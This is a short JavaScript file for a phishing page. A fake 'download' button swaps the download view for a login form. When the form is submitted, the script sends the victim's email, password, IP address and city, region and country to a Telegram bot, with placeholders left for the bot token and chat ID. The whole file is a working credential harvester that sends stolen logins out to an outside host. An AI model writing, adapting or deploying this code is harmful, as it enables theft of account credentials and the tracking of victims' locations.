const downloadBtn = document.getElementById('downloadBtn');
const downloadPage = document.getElementById('downloadPage');
const loginPage = document.getElementById('loginPage');

downloadBtn.addEventListener('click', function(event) {
    event.preventDefault();
    downloadPage.style.display = 'none';
    loginPage.style.display = 'block';
});

document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Get IP address from IP API
    const ipResponse = await fetch('https://ipapi.co/json/');
    const ipData = await ipResponse.json();

    const botToken = '{{botToken}}'; // Replace with actual bot token
    const chatId = '{{chatId}}'; // Replace with actual chat ID

    // Send data to Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Login Details:\nEmail: ${email}\nPassword: ${password}\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Telegram Response:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
